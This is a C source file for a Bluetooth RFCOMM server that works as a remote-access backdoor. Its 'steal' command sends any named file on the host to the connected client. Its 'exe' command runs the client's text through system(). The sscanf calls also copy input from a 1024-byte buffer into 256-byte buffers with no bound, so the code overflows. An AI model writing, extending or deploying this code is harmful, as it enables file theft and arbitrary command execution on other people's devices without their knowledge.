#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/rfcomm.h>
#include "scanner.h"

#define BUF 1024

int main(int argc, char **argv)
{
	struct sockaddr_rc serv_addr = { 0 }, cli_addr = { 0 };
	// this is needed so that it can work properly with accpet!!!
	int s, client, items_read, status; 
	socklen_t opt = sizeof(cli_addr);// this is used to hold the size of the client tp be passed right 
	char buf[BUF], file_name[256]; // inits the buffer to be this size, will change if needed
	char (*con)[18];
	FILE *fp;
	char command_buf[256];

	s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM); //Thi will make the socket

	serv_addr.rc_family = AF_BLUETOOTH; // set for bluetooth comms
	serv_addr.rc_bdaddr = *BDADDR_ANY; // connects to any bluetooth device needs to be changed for later
	serv_addr.rc_channel = (uint8_t)1; // sets the serv addr to channel one
	bind(s, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
	// bind will allows connections from the client! (cli_addr)

	listen(s, 1); // makes the socket listen to any connections and limits it to only one connection

	client = accept(s, (struct sockaddr *)&cli_addr, &opt);

	ba2str( &cli_addr.rc_bdaddr, buf );
	fprintf(stderr, "accepted connection from %s\n", buf);
	while(1) {
		memset(buf, 0, sizeof(buf));

		items_read = read(client, buf, sizeof(buf)); 		
		if (items_read < 0 ) {
			perror("Didn't Get Message"); 
			break;
		}
		printf("Message Received: %s\n", buf);

		if (write(client, buf, items_read) < 0) {
			perror("Couldn't Send Message");// error control
			break;
		}
		if (strncmp(buf, "scan", 4) == 0){
			printf("Starting to scan\n");
			con = scanner();
		}
		if (strncmp(buf, "steal", 5) == 0) {

			printf("THIS IS WHAT IS IN THE BUFFER: %s\n\n", buf);

			sscanf(buf, "steal %[^\n]", file_name);
			printf("THIS IS THE FILE NAME: %s\n", file_name);
			fp = fopen(file_name, "rb");
			if (fp == NULL) {
				perror("Error opening file");
				printf("errno=%d\n", errno);
				close(client);
				close(s);
				return 1;
			}

			int bytes_read = fread(buf, 1, BUF, fp);
			while (bytes_read > 0) {
				// send the read bytes to the client
				printf("BYTES READ CONTENT: %d\n", bytes_read);
				int bytes_sent = write(client, buf, bytes_read);
				if (bytes_sent < 0) {
					perror("Error sending file data to client");
					break;
				}
				// read the next chunk of bytes
				bytes_read = fread(buf, 1, BUF, fp);
			}

			// close the file and the sockets
			fclose(fp);
			close(client);
			close(s);

			return 0;
		}
		if (strncmp(buf, "exe", 3) == 0) {
			printf("This is the contents of the buffer: %s\n", buf);
			sscanf(buf, "exe %[^\n]", command_buf);
			printf("Executing command: %s\n", command_buf);
			status = system(command_buf);
			if (status < 0) {
				perror("Error executing command");
			}
			continue;
		}

		
	}
	close(client); // important to close the client and the socket we made!!!!
	close(s);
	return 0;
}
